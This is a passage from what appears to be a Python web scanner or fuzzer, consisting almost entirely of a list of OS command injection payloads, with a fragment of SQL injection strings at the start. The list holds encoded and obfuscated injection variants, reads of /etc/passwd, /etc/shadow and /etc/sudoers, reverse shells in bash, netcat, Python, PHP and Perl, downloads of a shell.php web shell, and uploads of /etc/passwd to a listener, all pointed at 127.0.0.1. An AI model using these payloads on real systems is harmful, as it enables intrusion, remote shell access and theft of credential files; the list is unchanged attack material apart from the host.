            "'; SELECT /*+ PQ_NOODCIBLOB_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOODCIBLOB_INDEX */ * FROM table --",
            
        ]
        
        self.command_payloads = [

            ";id",
            ";whoami",
            ";pwd",
            ";ls",
            ";ls -la",
            ";cat /etc/passwd",
            

            "|id",
            "|whoami",
            "|pwd",
            "|ls",
            "|ls -la",
            "|cat /etc/passwd",
            

            "`id`",
            "`whoami`",
            "`pwd`",
            "`ls`",
            "`ls -la`",
            "`cat /etc/passwd`",
            

            "$(id)",
            "$(whoami)",
            "$(pwd)",
            "$(ls)",
            "$(ls -la)",
            "$(cat /etc/passwd)",
            

            "||id",
            "||whoami",
            "||pwd",
            "||ls",
            "||ls -la",
            "||cat /etc/passwd",
            
            "&&id",
            "&&whoami",
            "&&pwd",
            "&&ls",
            "&&ls -la",
            "&&cat /etc/passwd",
            

            ">id",
            ">whoami",
            ">pwd",
            ">ls",
            ">ls -la",
            ">cat /etc/passwd",
            

            "\nid",
            "\nwhoami",
            "\npwd",
            "\nls",
            "\nls -la",
            "\ncat /etc/passwd",
            

            "\tid",
            "\twhoami",
            "\tpwd",
            "\tls",
            "\tls -la",
            "\tcat /etc/passwd",
            

            "\rid",
            "\rwhoami",
            "\rpwd",
            "\rls",
            "\rls -la",
            "\rcat /etc/passwd",
            

            "\fid",
            "\fwhoami",
            "\fpwd",
            "\fls",
            "\fls -la",
            "\fcat /etc/passwd",
            

            "\vid",
            "\vwhoami",
            "\vpwd",
            "\vls",
            "\vls -la",
            "\vcat /etc/passwd",
            

            "\0id",
            "\0whoami",
            "\0pwd",
            "\0ls",
            "\0ls -la",
            "\0cat /etc/passwd",
            

            ";id;",
            "|id|",
            "`id`",
            "$(id)",
            "||id||",
            "&&id&&",
            

            " ; id ",
            " | id ",
            " ` id ` ",
            " $( id ) ",
            " || id || ",
            " && id && ",
            

            ";id;",
            "|id|",
            "`id`",
            "$(id)",
            "||id||",
            "&&id&&",
            

            "%3bid",
            "%7cid",
            "%60id%60",
            "%24%28id%29",
            "%7c%7cid%7c%7c",
            "%26%26id%26%26",
            

            "%253bid",
            "%257cid",
            "%2560id%2560",
            "%2524%2528id%2529",
            "%257c%257cid%257c%257c",
            "%2526%2526id%2526%2526",
            

            "%u003bid",
            "%u007cid",
            "%u0060id%u0060",
            "%u0024%u0028id%u0029",
            "%u007c%u007cid%u007c%u007c",
            "%u0026%u0026id%u0026%u0026",
            

            "\\x3bid",
            "\\x7cid",
            "\\x60id\\x60",
            "\\x24\\x28id\\x29",
            "\\x7c\\x7cid\\x7c\\x7c",
            "\\x26\\x26id\\x26\\x26",
            

            "\\073id",
            "\\174id",
            "\\140id\\140",
            "\\044\\050id\\051",
            "\\174\\174id\\174\\174",
            "\\046\\046id\\046\\046",
            

            "%3b%69%64",
            "%7c%69%64",
            "%60%69%64%60",
            "%24%28%69%64%29",
            "%7c%7c%69%64%7c%7c",
            "%26%26%69%64%26%26",
            

            ";Id",
            ";ID",
            ";iD",
            ";Id",
            
            "|Id",
            "|ID",
            "|iD",
            "|Id",
            
            "`Id`",
            "`ID`",
            "`iD`",
            "`Id`",
            
            "$(Id)",
            "$(ID)",
            "$(iD)",
            "$(Id)",
            
            "||Id||",
            "||ID||",
            "||iD||",
            "||Id||",
            
            "&&Id&&",
            "&&ID&&",
            "&&iD&&",
            "&&Id&&",
            

            ";uname -a",
            ";uname -r",
            ";uname -m",
            ";uname -n",
            ";uname -s",
            ";uname -v",
            
            "|uname -a",
            "|uname -r",
            "|uname -m",
            "|uname -n",
            "|uname -s",
            "|uname -v",
            
            "`uname -a`",
            "`uname -r`",
            "`uname -m`",
            "`uname -n`",
            "`uname -s`",
            "`uname -v`",
            
            "$(uname -a)",
            "$(uname -r)",
            "$(uname -m)",
            "$(uname -n)",
            "$(uname -s)",
            "$(uname -v)",
            
            "||uname -a||",
            "||uname -r||",
            "||uname -m||",
            "||uname -n||",
            "||uname -s||",
            "||uname -v||",
            
            "&&uname -a&&",
            "&&uname -r&&",
            "&&uname -m&&",
            "&&uname -n&&",
            "&&uname -s&&",
            "&&uname -v&&",
            

            ";ps aux",
            ";ps -ef",
            ";ps -aux",
            ";ps -elf",
            ";ps -eLf",
            ";ps -eo pid,ppid,cmd",
            
            "|ps aux",
            "|ps -ef",
            "|ps -aux",
            "|ps -elf",
            "|ps -eLf",
            "|ps -eo pid,ppid,cmd",
            
            "`ps aux`",
            "`ps -ef`",
            "`ps -aux`",
            "`ps -elf`",
            "`ps -eLf`",
            "`ps -eo pid,ppid,cmd`",
            
            "$(ps aux)",
            "$(ps -ef)",
            "$(ps -aux)",
            "$(ps -elf)",
            "$(ps -eLf)",
            "$(ps -eo pid,ppid,cmd)",
            
            "||ps aux||",
            "||ps -ef||",
            "||ps -aux||",
            "||ps -elf||",
            "||ps -eLf||",
            "||ps -eo pid,ppid,cmd||",
            
            "&&ps aux&&",
            "&&ps -ef&&",
            "&&ps -aux&&",
            "&&ps -elf&&",
            "&&ps -eLf&&",
            "&&ps -eo pid,ppid,cmd&&",
            

            ";netstat -an",
            ";netstat -rn",
            ";netstat -tulpn",
            ";netstat -lntp",
            ";netstat -plant",
            ";netstat -ano",
            
            "|netstat -an",
            "|netstat -rn",
            "|netstat -tulpn",
            "|netstat -lntp",
            "|netstat -plant",
            "|netstat -ano",
            
            "`netstat -an`",
            "`netstat -rn`",
            "`netstat -tulpn`",
            "`netstat -lntp`",
            "`netstat -plant`",
            "`netstat -ano`",
            
            "$(netstat -an)",
            "$(netstat -rn)",
            "$(netstat -tulpn)",
            "$(netstat -lntp)",
            "$(netstat -plant)",
            "$(netstat -ano)",
            
            "||netstat -an||",
            "||netstat -rn||",
            "||netstat -tulpn||",
            "||netstat -lntp||",
            "||netstat -plant||",
            "||netstat -ano||",
            
            "&&netstat -an&&",
            "&&netstat -rn&&",
            "&&netstat -tulpn&&",
            "&&netstat -lntp&&",
            "&&netstat -plant&&",
            "&&netstat -ano&&",
            

            ";ifconfig",
            ";ip addr",
            ";ip a",
            ";ip link",
            ";ip route",
            ";ip -4 addr",
            
            "|ifconfig",
            "|ip addr",
            "|ip a",
            "|ip link",
            "|ip route",
            "|ip -4 addr",
            
            "`ifconfig`",
            "`ip addr`",
            "`ip a`",
            "`ip link`",
            "`ip route`",
            "`ip -4 addr`",
            
            "$(ifconfig)",
            "$(ip addr)",
            "$(ip a)",
            "$(ip link)",
            "$(ip route)",
            "$(ip -4 addr)",
            
            "||ifconfig||",
            "||ip addr||",
            "||ip a||",
            "||ip link||",
            "||ip route||",
            "||ip -4 addr||",
            
            "&&ifconfig&&",
            "&&ip addr&&",
            "&&ip a&&",
            "&&ip link&&",
            "&&ip route&&",
            "&&ip -4 addr&&",
            

            ";cat /etc/resolv.conf",
            ";cat /etc/hosts",
            ";cat /etc/hostname",
            ";cat /etc/nsswitch.conf",
            ";cat /etc/services",
            
            "|cat /etc/resolv.conf",
            "|cat /etc/hosts",
            "|cat /etc/hostname",
            "|cat /etc/nsswitch.conf",
            "|cat /etc/services",
            
            "`cat /etc/resolv.conf`",
            "`cat /etc/hosts`",
            "`cat /etc/hostname`",
            "`cat /etc/nsswitch.conf`",
            "`cat /etc/services`",
            
            "$(cat /etc/resolv.conf)",
            "$(cat /etc/hosts)",
            "$(cat /etc/hostname)",
            "$(cat /etc/nsswitch.conf)",
            "$(cat /etc/services)",
            
            "||cat /etc/resolv.conf||",
            "||cat /etc/hosts||",
            "||cat /etc/hostname||",
            "||cat /etc/nsswitch.conf||",
            "||cat /etc/services||",
            
            "&&cat /etc/resolv.conf&&",
            "&&cat /etc/hosts&&",
            "&&cat /etc/hostname&&",
            "&&cat /etc/nsswitch.conf&&",
            "&&cat /etc/services&&",
            

            ";cat /etc/passwd",
            ";cat /etc/group",
            ";cat /etc/shadow",
            ";cat /etc/gshadow",
            ";cat /etc/sudoers",
            
            "|cat /etc/passwd",
            "|cat /etc/group",
            "|cat /etc/shadow",
            "|cat /etc/gshadow",
            "|cat /etc/sudoers",
            
            "`cat /etc/passwd`",
            "`cat /etc/group`",
            "`cat /etc/shadow`",
            "`cat /etc/gshadow`",
            "`cat /etc/sudoers`",
            
            "$(cat /etc/passwd)",
            "$(cat /etc/group)",
            "$(cat /etc/shadow)",
            "$(cat /etc/gshadow)",
            "$(cat /etc/sudoers)",
            
            "||cat /etc/passwd||",
            "||cat /etc/group||",
            "||cat /etc/shadow||",
            "||cat /etc/gshadow||",
            "||cat /etc/sudoers||",
            
            "&&cat /etc/passwd&&",
            "&&cat /etc/group&&",
            "&&cat /etc/shadow&&",
            "&&cat /etc/gshadow&&",
            "&&cat /etc/sudoers&&",
            

            ";df -h",
            ";df -i",
            ";du -sh",
            ";du -sh /*",
            ";du -sh /home/*",
            ";du -sh /var/*",
            
            "|df -h",
            "|df -i",
            "|du -sh",
            "|du -sh /*",
            "|du -sh /home/*",
            "|du -sh /var/*",
            
            "`df -h`",
            "`df -i`",
            "`du -sh`",
            "`du -sh /*`",
            "`du -sh /home/*`",
            "`du -sh /var/*`",
            
            "$(df -h)",
            "$(df -i)",
            "$(du -sh)",
            "$(du -sh /*)",
            "$(du -sh /home/*)",
            "$(du -sh /var/*)",
            
            "||df -h||",
            "||df -i||",
            "||du -sh||",
            "||du -sh /*||",
            "||du -sh /home/*||",
            "||du -sh /var/*||",
            
            "&&df -h&&",
            "&&df -i&&",
            "&&du -sh&&",
            "&&du -sh /*&&",
            "&&du -sh /home/*&&",
            "&&du -sh /var/*&&",
            

            ";free -h",
            ";free -m",
            ";free -g",
            ";cat /proc/meminfo",
            ";vmstat",
            ";top -n 1",
            
            "|free -h",
            "|free -m",
            "|free -g",
            "|cat /proc/meminfo",
            "|vmstat",
            "|top -n 1",
            
            "`free -h`",
            "`free -m`",
            "`free -g`",
            "`cat /proc/meminfo`",
            "`vmstat`",
            "`top -n 1`",
            
            "$(free -h)",
            "$(free -m)",
            "$(free -g)",
            "$(cat /proc/meminfo)",
            "$(vmstat)",
            "$(top -n 1)",
            
            "||free -h||",
            "||free -m||",
            "||free -g||",
            "||cat /proc/meminfo||",
            "||vmstat||",
            "||top -n 1||",
            
            "&&free -h&&",
            "&&free -m&&",
            "&&free -g&&",
            "&&cat /proc/meminfo&&",
            "&&vmstat&&",
            "&&top -n 1&&",
            

            ";cat /proc/cpuinfo",
            ";lscpu",
            ";nproc",
            ";uptime",
            ";w",
            ";who",
            
            "|cat /proc/cpuinfo",
            "|lscpu",
            "|nproc",
            "|uptime",
            "|w",
            "|who",
            
            "`cat /proc/cpuinfo`",
            "`lscpu`",
            "`nproc`",
            "`uptime`",
            "`w`",
            "`who`",
            
            "$(cat /proc/cpuinfo)",
            "$(lscpu)",
            "$(nproc)",
            "$(uptime)",
            "$(w)",
            "$(who)",
            
            "||cat /proc/cpuinfo||",
            "||lscpu||",
            "||nproc||",
            "||uptime||",
            "||w||",
            "||who||",
            
            "&&cat /proc/cpuinfo&&",
            "&&lscpu&&",
            "&&nproc&&",
            "&&uptime&&",
            "&&w&&",
            "&&who&&",
            

            ";env",
            ";printenv",
            ";set",
            ";echo $PATH",
            ";echo $HOME",
            ";echo $USER",
            
            "|env",
            "|printenv",
            "|set",
            "|echo $PATH",
            "|echo $HOME",
            "|echo $USER",
            
            "`env`",
            "`printenv`",
            "`set`",
            "`echo $PATH`",
            "`echo $HOME`",
            "`echo $USER`",
            
            "$(env)",
            "$(printenv)",
            "$(set)",
            "$(echo $PATH)",
            "$(echo $HOME)",
            "$(echo $USER)",
            
            "||env||",
            "||printenv||",
            "||set||",
            "||echo $PATH||",
            "||echo $HOME||",
            "||echo $USER||",
            
            "&&env&&",
            "&&printenv&&",
            "&&set&&",
            "&&echo $PATH&&",
            "&&echo $HOME&&",
            "&&echo $USER&&",
            

            ";cat /proc/version",
            ";cat /proc/sys/kernel/osrelease",
            ";cat /proc/sys/kernel/ostype",
            ";cat /proc/sys/kernel/hostname",
            ";cat /proc/sys/kernel/domainname",
            
            "|cat /proc/version",
            "|cat /proc/sys/kernel/osrelease",
            "|cat /proc/sys/kernel/ostype",
            "|cat /proc/sys/kernel/hostname",
            "|cat /proc/sys/kernel/domainname",
            
            "`cat /proc/version`",
            "`cat /proc/sys/kernel/osrelease`",
            "`cat /proc/sys/kernel/ostype`",
            "`cat /proc/sys/kernel/hostname`",
            "`cat /proc/sys/kernel/domainname`",
            
            "$(cat /proc/version)",
            "$(cat /proc/sys/kernel/osrelease)",
            "$(cat /proc/sys/kernel/ostype)",
            "$(cat /proc/sys/kernel/hostname)",
            "$(cat /proc/sys/kernel/domainname)",
            
            "||cat /proc/version||",
            "||cat /proc/sys/kernel/osrelease||",
            "||cat /proc/sys/kernel/ostype||",
            "||cat /proc/sys/kernel/hostname||",
            "||cat /proc/sys/kernel/domainname||",
            
            "&&cat /proc/version&&",
            "&&cat /proc/sys/kernel/osrelease&&",
            "&&cat /proc/sys/kernel/ostype&&",
            "&&cat /proc/sys/kernel/hostname&&",
            "&&cat /proc/sys/kernel/domainname&&",
            

            ";systemctl list-units",
            ";systemctl list-unit-files",
            ";service --status-all",
            ";chkconfig --list",
            ";initctl list",
            
            "|systemctl list-units",
            "|systemctl list-unit-files",
            "|service --status-all",
            "|chkconfig --list",
            "|initctl list",
            
            "`systemctl list-units`",
            "`systemctl list-unit-files`",
            "`service --status-all`",
            "`chkconfig --list`",
            "`initctl list`",
            
            "$(systemctl list-units)",
            "$(systemctl list-unit-files)",
            "$(service --status-all)",
            "$(chkconfig --list)",
            "$(initctl list)",
            
            "||systemctl list-units||",
            "||systemctl list-unit-files||",
            "||service --status-all||",
            "||chkconfig --list||",
            "||initctl list||",
            
            "&&systemctl list-units&&",
            "&&systemctl list-unit-files&&",
            "&&service --status-all&&",
            "&&chkconfig --list&&",
            "&&initctl list&&",
            

            ";dpkg -l",
            ";rpm -qa",
            ";yum list installed",
            ";apt list --installed",
            ";pacman -Q",
            
            "|dpkg -l",
            "|rpm -qa",
            "|yum list installed",
            "|apt list --installed",
            "|pacman -Q",
            
            "`dpkg -l`",
            "`rpm -qa`",
            "`yum list installed`",
            "`apt list --installed`",
            "`pacman -Q`",
            
            "$(dpkg -l)",
            "$(rpm -qa)",
            "$(yum list installed)",
            "$(apt list --installed)",
            "$(pacman -Q)",
            
            "||dpkg -l||",
            "||rpm -qa||",
            "||yum list installed||",
            "||apt list --installed||",
            "||pacman -Q||",
            
            "&&dpkg -l&&",
            "&&rpm -qa&&",
            "&&yum list installed&&",
            "&&apt list --installed&&",
            "&&pacman -Q&&",
            

            ";apache2 -v",
            ";apache2ctl -v",
            ";httpd -v",
            ";nginx -v",
            ";lighttpd -v",
            
            "|apache2 -v",
            "|apache2ctl -v",
            "|httpd -v",
            "|nginx -v",
            "|lighttpd -v",
            
            "`apache2 -v`",
            "`apache2ctl -v`",
            "`httpd -v`",
            "`nginx -v`",
            "`lighttpd -v`",
            
            "$(apache2 -v)",
            "$(apache2ctl -v)",
            "$(httpd -v)",
            "$(nginx -v)",
            "$(lighttpd -v)",
            
            "||apache2 -v||",
            "||apache2ctl -v||",
            "||httpd -v||",
            "||nginx -v||",
            "||lighttpd -v||",
            
            "&&apache2 -v&&",
            "&&apache2ctl -v&&",
            "&&httpd -v&&",
            "&&nginx -v&&",
            "&&lighttpd -v&&",
            

            ";mysql --version",
            ";psql --version",
            ";mongod --version",
            ";redis-server --version",
            ";sqlite3 --version",
            
            "|mysql --version",
            "|psql --version",
            "|mongod --version",
            "|redis-server --version",
            "|sqlite3 --version",
            
            "`mysql --version`",
            "`psql --version`",
            "`mongod --version`",
            "`redis-server --version`",
            "`sqlite3 --version`",
            
            "$(mysql --version)",
            "$(psql --version)",
            "$(mongod --version)",
            "$(redis-server --version)",
            "$(sqlite3 --version)",
            
            "||mysql --version||",
            "||psql --version||",
            "||mongod --version||",
            "||redis-server --version||",
            "||sqlite3 --version||",
            
            "&&mysql --version&&",
            "&&psql --version&&",
            "&&mongod --version&&",
            "&&redis-server --version&&",
            "&&sqlite3 --version&&",
            

            ";python --version",
            ";python3 --version",
            ";php --version",
            ";ruby --version",
            ";perl --version",
            ";node --version",
            ";java -version",
            ";go version",
            
            "|python --version",
            "|python3 --version",
            "|php --version",
            "|ruby --version",
            "|perl --version",
            "|node --version",
            "|java -version",
            "|go version",
            
            "`python --version`",
            "`python3 --version`",
            "`php --version`",
            "`ruby --version`",
            "`perl --version`",
            "`node --version`",
            "`java -version`",
            "`go version`",
            
            "$(python --version)",
            "$(python3 --version)",
            "$(php --version)",
            "$(ruby --version)",
            "$(perl --version)",
            "$(node --version)",
            "$(java -version)",
            "$(go version)",
            
            "||python --version||",
            "||python3 --version||",
            "||php --version||",
            "||ruby --version||",
            "||perl --version||",
            "||node --version||",
            "||java -version||",
            "||go version||",
            
            "&&python --version&&",
            "&&python3 --version&&",
            "&&php --version&&",
            "&&ruby --version&&",
            "&&perl --version&&",
            "&&node --version&&",
            "&&java -version&&",
            "&&go version&&",
            

            ";touch /tmp/test",
            ";mkdir /tmp/test",
            ";rm /tmp/test",
            ";rm -rf /tmp/test",
            ";cp /etc/passwd /tmp/passwd",
            ";mv /tmp/test /tmp/test2",
            
            "|touch /tmp/test",
            "|mkdir /tmp/test",
            "|rm /tmp/test",
            "|rm -rf /tmp/test",
            "|cp /etc/passwd /tmp/passwd",
            "|mv /tmp/test /tmp/test2",
            
            "`touch /tmp/test`",
            "`mkdir /tmp/test`",
            "`rm /tmp/test`",
            "`rm -rf /tmp/test`",
            "`cp /etc/passwd /tmp/passwd`",
            "`mv /tmp/test /tmp/test2`",
            
            "$(touch /tmp/test)",
            "$(mkdir /tmp/test)",
            "$(rm /tmp/test)",
            "$(rm -rf /tmp/test)",
            "$(cp /etc/passwd /tmp/passwd)",
            "$(mv /tmp/test /tmp/test2)",
            
            "||touch /tmp/test||",
            "||mkdir /tmp/test||",
            "||rm /tmp/test||",
            "||rm -rf /tmp/test||",
            "||cp /etc/passwd /tmp/passwd||",
            "||mv /tmp/test /tmp/test2||",
            
            "&&touch /tmp/test&&",
            "&&mkdir /tmp/test&&",
            "&&rm /tmp/test&&",
            "&&rm -rf /tmp/test&&",
            "&&cp /etc/passwd /tmp/passwd&&",
            "&&mv /tmp/test /tmp/test2&&",
            

            ";ping -c 1 127.0.0.1",
            ";ping -c 1 localhost",
            ";curl http://127.0.0.1",
            ";wget http://127.0.0.1",
            ";nc -zv 127.0.0.1 80",
            ";telnet 127.0.0.1 80",
            
            "|ping -c 1 127.0.0.1",
            "|ping -c 1 localhost",
            "|curl http://127.0.0.1",
            "|wget http://127.0.0.1",
            "|nc -zv 127.0.0.1 80",
            "|telnet 127.0.0.1 80",
            
            "`ping -c 1 127.0.0.1`",
            "`ping -c 1 localhost`",
            "`curl http://127.0.0.1`",
            "`wget http://127.0.0.1`",
            "`nc -zv 127.0.0.1 80`",
            "`telnet 127.0.0.1 80`",
            
            "$(ping -c 1 127.0.0.1)",
            "$(ping -c 1 localhost)",
            "$(curl http://127.0.0.1)",
            "$(wget http://127.0.0.1)",
            "$(nc -zv 127.0.0.1 80)",
            "$(telnet 127.0.0.1 80)",
            
            "||ping -c 1 127.0.0.1||",
            "||ping -c 1 localhost||",
            "||curl http://127.0.0.1||",
            "||wget http://127.0.0.1||",
            "||nc -zv 127.0.0.1 80||",
            "||telnet 127.0.0.1 80||",
            
            "&&ping -c 1 127.0.0.1&&",
            "&&ping -c 1 localhost&&",
            "&&curl http://127.0.0.1&&",
            "&&wget http://127.0.0.1&&",
            "&&nc -zv 127.0.0.1 80&&",
            "&&telnet 127.0.0.1 80&&",
            

            ";bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
            ";nc -e /bin/bash 127.0.0.1 4444",
            ";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f",
            ";python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            ";php -r '$sock=fsockopen(\"127.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            ";perl -e 'use Socket;$i=\"127.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            
            "|bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
            "|nc -e /bin/bash 127.0.0.1 4444",
            "|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f",
            "|python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "|php -r '$sock=fsockopen(\"127.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "|perl -e 'use Socket;$i=\"127.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            
            "`bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`",
            "`nc -e /bin/bash 127.0.0.1 4444`",
            "`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f`",
            "`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'`",
            "`php -r '$sock=fsockopen(\"127.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'`",
            "`perl -e 'use Socket;$i=\"127.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'`",
            
            "$(bash -i >& /dev/tcp/127.0.0.1/4444 0>&1)",
            "$(nc -e /bin/bash 127.0.0.1 4444)",
            "$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f)",
            "$(python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);')",
            "$(php -r '$sock=fsockopen(\"127.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");')",
            "$(perl -e 'use Socket;$i=\"127.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};')",
            
            "||bash -i >& /dev/tcp/127.0.0.1/4444 0>&1||",
            "||nc -e /bin/bash 127.0.0.1 4444||",
            "||rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f||",
            "||python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'||",
            "||php -r '$sock=fsockopen(\"127.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'||",
            "||perl -e 'use Socket;$i=\"127.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'||",
            
            "&&bash -i >& /dev/tcp/127.0.0.1/4444 0>&1&&",
            "&&nc -e /bin/bash 127.0.0.1 4444&&",
            "&&rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f&&",
            "&&python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'&&",
            "&&php -r '$sock=fsockopen(\"127.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'&&",
            "&&perl -e 'use Socket;$i=\"127.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'&&",
            

            ";wget http://127.0.0.1/shell.php -O /tmp/shell.php",
            ";curl http://127.0.0.1/shell.php -o /tmp/shell.php",
            ";ftp -n 127.0.0.1 <<EOF\nuser anonymous anonymous\nbinary\nget shell.php /tmp/shell.php\nquit\nEOF",
            ";tftp 127.0.0.1 <<EOF\nget shell.php /tmp/shell.php\nquit\nEOF",
            
            "|wget http://127.0.0.1/shell.php -O /tmp/shell.php",
            "|curl http://127.0.0.1/shell.php -o /tmp/shell.php",
            "|ftp -n 127.0.0.1 <<EOF\nuser anonymous anonymous\nbinary\nget shell.php /tmp/shell.php\nquit\nEOF",
            "|tftp 127.0.0.1 <<EOF\nget shell.php /tmp/shell.php\nquit\nEOF",
            
            "`wget http://127.0.0.1/shell.php -O /tmp/shell.php`",
            "`curl http://127.0.0.1/shell.php -o /tmp/shell.php`",
            "`ftp -n 127.0.0.1 <<EOF\nuser anonymous anonymous\nbinary\nget shell.php /tmp/shell.php\nquit\nEOF`",
            "`tftp 127.0.0.1 <<EOF\nget shell.php /tmp/shell.php\nquit\nEOF`",
            
            "$(wget http://127.0.0.1/shell.php -O /tmp/shell.php)",
            "$(curl http://127.0.0.1/shell.php -o /tmp/shell.php)",
            "$(ftp -n 127.0.0.1 <<EOF\nuser anonymous anonymous\nbinary\nget shell.php /tmp/shell.php\nquit\nEOF)",
            "$(tftp 127.0.0.1 <<EOF\nget shell.php /tmp/shell.php\nquit\nEOF)",
            
            "||wget http://127.0.0.1/shell.php -O /tmp/shell.php||",
            "||curl http://127.0.0.1/shell.php -o /tmp/shell.php||",
            "||ftp -n 127.0.0.1 <<EOF\nuser anonymous anonymous\nbinary\nget shell.php /tmp/shell.php\nquit\nEOF||",
            "||tftp 127.0.0.1 <<EOF\nget shell.php /tmp/shell.php\nquit\nEOF||",
            
            "&&wget http://127.0.0.1/shell.php -O /tmp/shell.php&&",
            "&&curl http://127.0.0.1/shell.php -o /tmp/shell.php&&",
            "&&ftp -n 127.0.0.1 <<EOF\nuser anonymous anonymous\nbinary\nget shell.php /tmp/shell.php\nquit\nEOF&&",
            "&&tftp 127.0.0.1 <<EOF\nget shell.php /tmp/shell.php\nquit\nEOF&&",
            

            ";curl -X POST -F 'file=@/etc/passwd' http://127.0.0.1/upload",
            ";wget --post-file=/etc/passwd http://127.0.0.1/upload",
            ";ftp -n 127.0.0.1 <<EOF\nuser anonymous anonymous\nbinary\nput /etc/passwd /tmp/passwd\nquit\nEOF",
            ";tftp 127.0.0.1 <<EOF\nput /etc/passwd /tmp/passwd\nquit\nEOF",
            
            "|curl -X POST -F 'file=@/etc/passwd' http://127.0.0.1/upload",
            "|wget --post-file=/etc/passwd http://127.0.0.1/upload",
            "|ftp -n 127.0.0.1 <<EOF\nuser anonymous anonymous\nbinary\nput /etc/passwd /tmp/passwd\nquit\nEOF",
            "|tftp 127.0.0.1 <<EOF\nput /etc/passwd /tmp/passwd\nquit\nEOF",
            
            "`curl -X POST -F 'file=@/etc/passwd' http://127.0.0.1/upload`",
            "`wget --post-file=/etc/passwd http://127.0.0.1/upload`",
            "`ftp -n 127.0.0.1 <<EOF\nuser anonymous anonymous\nbinary\nput /etc/passwd /tmp/passwd\nquit\nEOF`",
            "`tftp 127.0.0.1 <<EOF\nput /etc/passwd /tmp/passwd\nquit\nEOF`",
            
            "$(curl -X POST -F 'file=@/etc/passwd' http://127.0.0.1/upload)",
            "$(wget --post-file=/etc/passwd http://127.0.0.1/upload)",
            "$(ftp -n 127.0.0.1 <<EOF\nuser anonymous anonymous\nbinary\nput /etc/passwd /tmp/passwd\nquit\nEOF)",
            "$(tftp 127.0.0.1 <<EOF\nput /etc/passwd /tmp/passwd\nquit\nEOF)",
            
            "||curl -X POST -F 'file=@/etc/passwd' http://127.0.0.1/upload||",
            "||wget --post-file=/etc/passwd http://127.0.0.1/upload||",
            "||ftp -n 127.0.0.1 <<EOF\nuser anonymous anonymous\nbinary\nput /etc/passwd /tmp/passwd\nquit\nEOF||",
            "||tftp 127.0.0.1 <<EOF\nput /etc/passwd /tmp/passwd\nquit\nEOF||",
            
            "&&curl -X POST -F 'file=@/etc/passwd' http://127.0.0.1/upload&&",
